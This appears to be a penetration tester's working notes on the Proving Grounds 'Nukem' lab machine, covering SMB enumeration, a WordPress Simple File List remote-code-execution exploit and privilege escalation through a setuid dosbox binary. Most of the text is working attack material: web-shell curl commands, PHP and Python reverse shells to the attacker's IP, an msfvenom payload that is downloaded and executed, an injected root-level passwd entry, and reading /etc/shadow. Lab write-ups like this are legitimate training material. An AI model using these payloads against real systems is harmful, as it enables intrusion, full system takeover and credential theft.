S-1-5-21-1483841968-2450327315-592764595-536 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-537 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-538 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-539 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-540 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-541 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-542 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-543 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-544 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-545 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-546 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-547 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-548 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-549 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-550 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1000 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1001 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1002 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1003 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1004 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1005 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1006 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1007 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1008 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1009 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1010 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1011 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-1012 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$    ```


### Get all files

```
┌──(kali㉿kali)-[~]
└─$ smbclient //127.0.0.1/Commander -N             
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 18 13:19:19 2020
  ..                                  D        0  Tue Feb 15 07:07:00 2022
  .gitignore                          H       15  Fri Sep 18 13:19:19 2020
  README.md                           N      417  Fri Sep 18 13:19:19 2020
  server.py                           N     2552  Fri Sep 18 13:19:19 2020
  requirements.txt                    N      287  Fri Sep 18 13:19:19 2020
  chinook.db                          N   884736  Fri Sep 18 13:19:19 2020

                9738528 blocks of size 1024. 5365252 blocks available
smb: \> lcd /tmp
smb: \> lcd smbfiles
smb: \> mget *
Get file .gitignore? y
getting file \.gitignore of size 15 as .gitignore (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
Get file README.md? y
getting file \README.md of size 417 as README.md (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)
Get file server.py? y
getting file \server.py of size 2552 as server.py (3.5 KiloBytes/sec) (average 1.4 KiloBytes/sec)
Get file requirements.txt? y
getting file \requirements.txt of size 287 as requirements.txt (0.4 KiloBytes/sec) (average 1.1 KiloBytes/sec)
Get file chinook.db? y
getting file \chinook.db of size 884736 as chinook.db (435.0 KiloBytes/sec) (average 179.7 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```bash
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ ls
chinook.db  README.md  requirements.txt  server.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ cat server.py 
#!/usr/bin/python3
from flask import Flask, request, jsonify
from flask_restful import Resource, Api
from sqlalchemy import create_engine
from json import dumps

db_connect = create_engine('sqlite:///chinook.db')
app = Flask(__name__)
api = Api(app)


class Employees(Resource):
    def get(self):
        conn = db_connect.connect() # connect to database
        query = conn.execute("select * from employees") # This line performs query and returns json result
        return {'employees': [i[0] for i in query.cursor.fetchall()]} # Fetches first column that is Employee ID
    
    def post(self):
        conn = db_connect.connect()
        print(request.json)
        LastName = request.json['LastName']
        FirstName = request.json['FirstName']
        Title = request.json['Title']
        ReportsTo = request.json['ReportsTo']
        BirthDate = request.json['BirthDate']
        HireDate = request.json['HireDate']
        Address = request.json['Address']
        City = request.json['City']
        State = request.json['State']
        Country = request.json['Country']
        PostalCode = request.json['PostalCode']
        Phone = request.json['Phone']
        Fax = request.json['Fax']
        Email = request.json['Email']
        query = conn.execute("insert into employees values(null,'{0}','{1}','{2}','{3}', \
                             '{4}','{5}','{6}','{7}','{8}','{9}','{10}','{11}','{12}', \
                             '{13}')".format(LastName,FirstName,Title,
                             ReportsTo, BirthDate, HireDate, Address,
                             City, State, Country, PostalCode, Phone, Fax,
                             Email))
        return {'status':'success'}

    
class Tracks(Resource):
    def get(self):
        conn = db_connect.connect()
        query = conn.execute("select trackid, name, composer, unitprice from tracks;")
        result = {'data': [dict(zip(tuple (query.keys()) ,i)) for i in query.cursor]}
        return jsonify(result)

    
class Employees_Name(Resource):
    def get(self, employee_id):
        conn = db_connect.connect()
        query = conn.execute("select * from employees where EmployeeId =%d "  %int(employee_id))
        result = {'data': [dict(zip(tuple (query.keys()) ,i)) for i in query.cursor]}
        return jsonify(result)


api.add_resource(Employees, '/employees') # Route_1
api.add_resource(Tracks, '/tracks') # Route_2
api.add_resource(Employees_Name, '/employees/<employee_id>') # Route_3


if __name__ == '__main__':
     app.run(host='0.0.0.0')
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ cat requirements.txt 
aniso8601==1.2.0
appdirs==1.4.0
click==6.7
Flask==1.0
Flask-Jsonpify==1.5.0
Flask-RESTful==0.3.5
Flask-SQLAlchemy==2.1
itsdangerous==0.24
Jinja2==2.9.5
MarkupSafe==0.23
packaging==16.8
pyparsing==2.1.10
python-dateutil==2.6.0
pytz==2016.10
six==1.10.0
SQLAlchemy==1.1.5
Werkzeug==0.15.3
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ cat README.md 
# Flask Rest API

This code is a self explanatory code, I got from [impythonist](https://impythonist.wordpress.com/2015/07/12/build-an-api-under-30-lines-of-code-with-python-and-flask/) blog. The current repository,
helps in getting started with the basic REST API Development of Flask. PRs are welcome for the other REQUESTS. The sole existence of
this repo is to spread the information and no profit is made on it.
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ ls -al
total 874
drwxrwxrwx 1 root root    480 Feb 17 21:21 .
drwxrwxrwx 1 root root   4096 Feb 17 21:21 ..
-rwxrwxrwx 1 root root 884736 Feb 17 21:21 chinook.db
-rwxrwxrwx 1 root root     15 Feb 17 21:21 .gitignore
-rwxrwxrwx 1 root root    417 Feb 17 21:21 README.md
-rwxrwxrwx 1 root root    287 Feb 17 21:21 requirements.txt
-rwxrwxrwx 1 root root   2552 Feb 17 21:21 server.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ cat .gitignore     
venv/
.DS_Store                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Offensive Security/Proving Ground Practices/Nukem/smbfiles]
└─$ 
```

### Database - Sqlite


![](Pasted%20image%2020220218102503.png)


### File write - success

```
┌──(kali㉿kali)-[~]
└─$ smbclient //127.0.0.1/Commander -N
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> lcd /tmp/smbfiles
smb: \> del .gitignore
smb: \> ls -al
NT_STATUS_NO_SUCH_FILE listing \-al
smb: \> ls
  .                                   D        0  Thu Feb 17 21:25:17 2022
  ..                                  D        0  Tue Feb 15 07:07:00 2022
  README.md                           N      417  Fri Sep 18 13:19:19 2020
  server.py                           N     2552  Fri Sep 18 13:19:19 2020
  requirements.txt                    N      287  Fri Sep 18 13:19:19 2020
  chinook.db                          N   884736  Fri Sep 18 13:19:19 2020

                9738528 blocks of size 1024. 5365256 blocks available
smb: \> put .gitignore
putting file .gitignore as \.gitignore (0.0 kb/s) (average 0.0 kb/s)
smb: \> 
```

# Exploitation

## Web Server Python api testong

```
┌──(kali㉿kali)-[~]
└─$ curl -H "Content-Type: application/json" http://localhost:5000/employees -X POST --data '{"LastName":"", "FirstName":"hacker", "Title":"hacker", "ReportsTo":"", "BirthDate":"", "HireDate":"", "Address":"", "City":"", "State":"", "Country":"", "PostalCode":"", "Phone":"", "Fax":"", "Email":""}'

{
    "status": "success"
}
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl -H "Content-Type: application/json" http://192.168.108.105:5000/employees -X POST --data '{"LastName":"", "FirstName":"hacker", "Title":"hacker", "ReportsTo":"", "BirthDate":"", "HireDate":"", "Address":"", "City":"", "State":"", "Country":"", "PostalCode":"", "Phone":"", "Fax":"", "Email":""}'

{"message": "Internal Server Error"}
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```

## Simple File List RCE

```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit simple file list                                                                                                                                 255 ⨯
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! Component mod_simpleFileLister 1.0 - Directory Traversal                                                                      | php/webapps/17736.txt
Simple Directory Listing 2 - Cross-Site Arbitrary File Upload                                                                         | php/webapps/7383.txt
WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload                                                                       | php/webapps/48979.py
WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                                                                       | php/webapps/48449.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 48449        
  Exploit: WordPress Plugin Simple File List 4.2.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48449
     Path: /usr/share/exploitdb/exploits/php/webapps/48449.py
File Type: Python script, ASCII text executable

Copied to: /tmp/48449.py


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 48449.py                                               

NAME: Wordpress v5.4 Simple File List v4.2.2, pre-auth RCE
SYNOPSIS: python wp_simple_file_list_4.2.2.py <URL>
AUTHOR: coiffeur
    
┌──(kali㉿kali)-[/tmp]
└─$ python3 48449.py http://192.168.108.105                                                                                                                       255 ⨯
[ ] File 9216.png generated with password: 5e3bb7a4b0adfaa6531d2d1b6abfb08d
[ ] File uploaded at http://192.168.108.105/wp-content/uploads/simple-file-list/9216.png
[ ] File moved to http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php
[+] Exploit seem to work.
[*] Confirmning ...
[+] Exploit work !
        URL: http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php
        Password: 5e3bb7a4b0adfaa6531d2d1b6abfb08d
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$                                                                                                                                                                     
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php --data "password=5e3bb7a4b0adfaa6531d2d1b6abfb08d&cmd=$(urlencode "echo 1;")"
1                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php --data "password=5e3bb7a4b0adfaa6531d2d1b6abfb08d&cmd=$(urlencode "system('whoami');")"
http
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Reverse Shell
```
curl http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php --data "password=5e3bb7a4b0adfaa6531d2d1b6abfb08d&cmd=$(urlencode "system('php -r \\'$sock=fsockopen(\"192.168.49.108\",13000);exec(\"/bin/bash <&3 >&3 2>&3\");\\'');")"
```
php -r \'$sock=fsockopen("192.168.49.108",13000);exec("/bin/bash <&3 >&3 2>&3");\'


```
curl http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php --data "password=5e3bb7a4b0adfaa6531d2d1b6abfb08d&cmd=$(urlencode 'system($_POST['"'"'c'"'"'])')&c=whoami
```

Generate payload

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.108 LPORT=13000 -f elf -o shell                                                                        1 ⚙
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: shell
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                                                                  1 ⚙
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.108.105 - - [17/Feb/2022 22:56:44] "GET /shell HTTP/1.1" 200 -
```

Download & execute payload

```
┌──(kali㉿kali)-[/tmp]
└─$ curl http://192.168.108.105/wp-content/uploads/simple-file-list/9216.php --data "password=5e3bb7a4b0adfaa6531d2d1b6abfb08d&cmd=$(urlencode "system('wget 192.168.49.108/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell');")"

```

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 13000
listening on [any] 13000 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.105] 38456
whoami
http
pwd
/srv/http/wp-content/uploads/simple-file-list
ls /home
commander
cd /home
cd commander
ls
Desktop
local.txt
python_rest_flask
cat local.txt
c5271a908700a5bfdb21a26ee818444e
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.108.105  netmask 255.255.255.0  broadcast 192.168.108.255
        inet6 fe80::250:56ff:feba:4c6f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:ba:4c:6f  txqueuelen 1000  (Ethernet)
        RX packets 22366  bytes 5046816 (4.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19350  bytes 11669083 (11.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 22  bytes 1100 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 22  bytes 1100 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


![](Pasted%20image%2020220218115728.png)

## Improve Reverse Shell
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.108",13000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'                                                                                                                                                            
```

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 13000                         
listening on [any] 13000 ...
connect to [192.168.49.108] from (UNKNOWN) [192.168.108.105] 38458
[http@nukem commander]$ ls
ls
Desktop  local.txt  python_rest_flask
[http@nukem commander]$ mkdir .ssh
mkdir .ssh
mkdir: cannot create directory '.ssh': Permission denied
[http@nukem commander]$
```

# Privesc

## lse

```bash
[http@nukem commander]$ cd /tmp
cd /tmp
[http@nukem tmp]$ wget 192.168.49.108/lse.sh
wget 192.168.49.108/lse.sh
--2022-02-18 03:58:04--  http://192.168.49.108/lse.sh
Connecting to 192.168.49.108:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: 'lse.sh'

lse.sh              100%[===================>]  42.55K   121KB/s    in 0.4s    

2022-02-18 03:58:05 (121 KB/s) - 'lse.sh' saved [43570/43570]

[http@nukem tmp]$ chmod +x lse.sh
chmod +x lse.sh
[http@nukem tmp]$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges: 

---

 LSE Version: 3.7                                                                                                                                                       

        User: http
     User ID: 33
    Password: none
        Home: /srv/http
        Path: /usr/local/sbin:/usr/local/bin:/usr/bin
       umask: 0022

    Hostname: nukem
       Linux: 5.8.9-arch2-1
Distribution: Arch Linux
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. yes!
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/lib/ssh/ssh-keysign
/usr/lib/Xorg.wrap
/usr/bin/ksu
/usr/bin/dosbox
/usr/bin/mount.cifs
/usr/bin/suexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sg
/usr/bin/unix_chkpwd
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. nope
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'http' have mail?.......................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'http'...................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... nope
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
[i] srv440 List /etc/rc.d/init.d permissions............................... skip                                                                                        
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip                                                                                        
[i] srv460 List /etc/init/ permissions..................................... skip                                                                                        
[!] srv500 Can we write in systemd service files?.......................... nope                                                                                        
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====                                                                                        
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. nope
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip                                                                                        
[i] sof520 Postgres version................................................ skip                                                                                        
[i] sof530 Apache version.................................................. skip                                                                                        
[i] sof540 Tmux version.................................................... skip                                                                                        
[i] sof550 Screen version.................................................. skip                                                                                        
=============================================================( containers )=====                                                                                        
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... nope
==============================================================( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... nope
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. skip
[*] pro020 Processes running with root permissions......................... yes!                                                                                        
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip                                                                                        
                                                                                                                                                                        
==================================( FINISHED )==================================                                                                                        
[http@nukem tmp]$ 
```

## dosbox suid file write test
```bash
[http@nukem tmp]$ dosbox -c 'mount c /' -c "echo 'dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash' >>c:\tmp\passwd" -c exit
<:0:0:root:/root:/bin/bash' >>c:\tmp\passwd" -c exit
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG: Using default settings. Create a configfile to change them
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:\tmp\passwd
[http@nukem tmp]$ cat /tmp/passwd
cat /tmp/passwd
cat: /tmp/passwd: No such file or directory
[http@nukem tmp]$ ls
ls
PASSWD  lse.sh  pulse-PKdhtXMmr18n  shell
[http@nukem tmp]$ cat PASSWD
cat PASSWD
'dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash'
[http@nukem tmp]$ ls -al PASSWD
ls -al PASSWD
-rw-r--r-- 1 root http 52 Feb 18 04:05 PASSWD
[http@nukem tmp]$ 
```

# DOSBOX overwrite file

```
dosbox -c 'mount c /' -c "echo dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash >>c:\tmp\passwd" -c exit
```


### DOSBOX get /etc/shadow

LFILE='\etc\shadow'
dosbox -c 'mount c /' -c "copy c:$LFILE >c:\tmp\output" -c exit
cat '/tmp/OUTPUT'

curl http://192.168.108.105/wp-content/uploads/simple-file-list/8856.php --data "password=6250e810f4ecf48ea7906a359afe4f34&cmd=$(urlencode "system('wget 192.168.49.108/shell -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell');")"


dosbox -c 'mount c /' -c "copy c:\etc\shadow  c:\tmp\output" -c exit


ssh WTyus9t6WYJxGh2baqRb5dqG4@nyc1.tmate.io

```
[http@nukem tmp]$ dosbox -c 'mount c /' -c "copy c:\etc\shadow  c:\tmp\output" -c exit
<c /' -c "copy c:\etc\shadow  c:\tmp\output" -c exit
DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
